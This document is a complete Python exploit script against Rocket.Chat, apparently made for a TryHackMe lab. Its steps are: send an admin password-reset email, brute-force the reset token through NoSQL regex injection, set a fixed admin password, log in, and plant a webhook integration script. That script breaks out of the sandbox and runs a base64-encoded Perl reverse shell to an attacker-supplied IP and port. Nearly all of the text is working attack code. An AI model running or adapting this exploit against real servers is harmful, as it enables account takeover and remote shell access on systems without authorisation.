#!/usr/bin/python3

import requests
import hashlib
import json
import argparse
import threading
import re
from base64 import b64encode

parser = argparse.ArgumentParser(description='THM rocket shell script...')
parser.add_argument('-a', help='Administrator email', required=True)
parser.add_argument('-t', help='URL (Eg: http://rocketchat.local)', required=True)
parser.add_argument('-r', help='RCE only, set to true if password already reset', default=False, type=bool)
parser.add_argument('-ip', help="IP for reverse shell", required=True)
parser.add_argument("-p", help="Port for reverse shell", required=True)
args = parser.parse_args()


adminmail = args.a
target = args.t


def forgotpassword(email,url):
	payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"sendForgotPasswordEmail\\",\\"params\\":[\\"'+email+'\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/sendForgotPasswordEmail", data = payload, headers = headers, verify = False, allow_redirects = False)
	print("[+] Password Reset Email Sent")


def resettoken(url):
	u = url+"/api/v1/method.callAnon/getPasswordPolicy"
	headers={'content-type': 'application/json'}
	token = ""

	characters = list("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_")

	def request(c):
		nonlocal token
		payload='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"getPasswordPolicy\\",\\"params\\":[{\\"token\\":{\\"$regex\\":\\"^%s\\"}}]}"}' % (token + c)
		r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
		if "Meteor.Error" not in r.text:
			token += c
			print(f"Got: {token:<43}", end="\r")

	while len(token)!= 43:
			for c in characters:
				while True:
					if threading.active_count() <= 20:
						thread = threading.Thread(target=request, args=(c))
						thread.start()
						break
					else:
						continue
				

	print(f"[+] Got token : {token}")
	return token


def changingpassword(url,token):
	payload = '{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"resetPassword\\",\\"params\\":[\\"'+token+'\\",\\"P@$$w0rd!1234\\"]}"}'
	headers={'content-type': 'application/json'}
	r = requests.post(url+"/api/v1/method.callAnon/resetPassword", data = payload, headers = headers, verify = False, allow_redirects = False)
	if "error" in r.text:
		exit("[-] Wrong token")
	print("[+] Password was changed to \"P@$$w0rd!1234\"!")



def rce(url, email, script):
	# Authenticating
	sha256pass = hashlib.sha256(b'P@$$w0rd!1234').hexdigest()
	headers={'content-type': 'application/json'}
	payload ='{"message":"{\\"msg\\":\\"method\\",\\"method\\":\\"login\\",\\"params\\":[{\\"user\\":{\\"email\\":\\"'+email+'\\"},\\"password\\":{\\"digest\\":\\"'+sha256pass+'\\",\\"algorithm\\":\\"sha-256\\"}}]}"}'
	r = requests.post(url + "/api/v1/method.callAnon/login",data=payload,headers=headers,verify=False,allow_redirects=False)
	if "error" in r.text:
		exit("[-] Couldn't authenticate")
	data = json.loads(r.text)
	data =(data['message'])
	userid = data[32:49]
	token = data[60:103]
	print("[+] Succesfully authenticated as administrator")

	# Creating Integration
	payload = '{"enabled":true,"channel":"#general","username":"admin","name":"rce","alias":"","avatarUrl":"","emoji":"","scriptEnabled":true,"script":"' + script +'","type":"webhook-incoming"}'
	cookies = {'rc_uid': userid,'rc_token': token}
	headers = {'X-User-Id': userid,'X-Auth-Token': token}
	r = requests.post(url+'/api/v1/integrations.create',cookies=cookies,headers=headers,data=payload)
	token = re.findall(r'"token":"(.+)","userId"', r.text)[0]
	_id = re.findall(r'Z","_id":"(.+)"}', r.text)[0]
	print(f"[+] got token: {token}")
	print(f"[+] got _id: {_id}")


	# Triggering RCE
	u = url + '/hooks/' + _id + '/' + token
	r = requests.get(u)
	print(r.text)

############################################################



## Sending Reset mail
if not args.r:
	print(f"[+] Resetting {adminmail} password")
	forgotpassword(adminmail,target)

	## Getting reset token
	token = resettoken(target)


	## Resetting Password
	changingpassword(target,token)

perl = 'perl -e \'use Socket;$i="'+args.ip+'";$p='+args.p+';socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("sh -i");};\''
print(perl)
perl = b64encode(perl.encode())

script = "class Script {\\n"\
	"process_incoming_request({ request }) { \\n"\
	"var exec = console.log.constructor(`return process.mainModule.require(\\\"child_process\\\").exec`)(), child;\\n"\
	"\\n"\
	"child = exec(`echo '"+perl.decode()+"' | base64 -d | sh`,\\n"\
	"function (error, stdout, stderr) {\\n"\
	"console.log('stdout: ' + stdout);\\n"\
	"console.log('stderr: ' + stderr);\\n"\
	"if (error !== null) {\\n"\
	"console.log('exec error: ' + error);\\n"\
	"}\\n"\
	"});\\n"\
	"child();\\n"\
	"}\\n"\
	"}"

rce(target, adminmail, script)